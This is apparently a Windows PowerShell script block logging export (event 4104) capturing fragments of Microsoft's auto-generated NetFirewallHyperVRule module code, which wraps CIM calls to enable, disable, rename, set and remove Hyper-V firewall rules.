      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVRule.cmdletDefinitIon.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetFirewallHyperVRule' -Alias '*'
        


ScriptBlock ID: 09608154-cddc-467f-b671-dde3ed1657ff
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 5):
)]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint16[]]
    ${RulePriority},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${VMCreatorId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Protocol},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.HyperVRuleStatus[]]
    ${EnforcementStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RulePriority') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RulePriority})
        $__cmdletization_queryBuilder.FilterByProperty('RulePriority', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('VMCreatorId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${VMCreatorId})
        $__cmdletization_queryBuilder.FilterByProperty('VMCreatorId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Protocol') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Protocol})
        $__cmdletization_queryBuilder.FilterByProperty('Protocol', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EnforcementStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EnforcementStatus})
        $__cmdletization_queryBuilder.FilterByProperty('EnforcementStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVRule.cmdletDefinitIon.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetFirewallHyperVRule' -Alias '*'
        

function Enable-NetFirewallHyperVRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint16[]]
    ${RulePriority},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${VMCreatorId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Protocol},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.HyperVRuleStatus[]]
    ${EnforcementStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RulePriority') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RulePriority})
        $__cmdletization_queryBuilder.FilterByProperty('RulePriority', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('VMCreatorId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${VMCreatorId})
        $__cmdletization_queryBuilder.FilterByProperty('VMCreatorId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Protocol') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Protocol})
        $__cmdletization_queryBuilder.FilterByProperty('Protocol', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EnforcementStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EnforcementStatus})
        $__cmdletization_queryBuilder.FilterByProperty('EnforcementStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = [Microsoft

ScriptBlock ID: 09608154-cddc-467f-b671-dde3ed1657ff
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 5):
thodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalAddresses')) {
            [object]$__cmdletization_value = ${LocalAddresses}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalPorts')) {
            [object]$__cmdletization_value = ${LocalPorts}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteAddresses')) {
            [object]$__cmdletization_value = ${RemoteAddresses}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemotePorts')) {
            [object]$__cmdletization_value = ${RemotePorts}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Action')) {
            [object]$__cmdletization_value = ${Action}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Enabled')) {
            [object]$__cmdletization_value = ${Enabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Profiles')) {
            [object]$__cmdletization_value = ${Profiles}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PortStatuses')) {
            [object]$__cmdletization_value = ${PortStatuses}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PortStatuses'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PortStatuses'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVRule.cmdletDefinitIon.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallHyperVRule' -Alias '*'
        

function Remove-NetFirewallHyperVRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint16[]]
    ${RulePriority},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${VMCreatorId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Protocol},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.HyperVRuleStatus[]]
    ${EnforcementStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
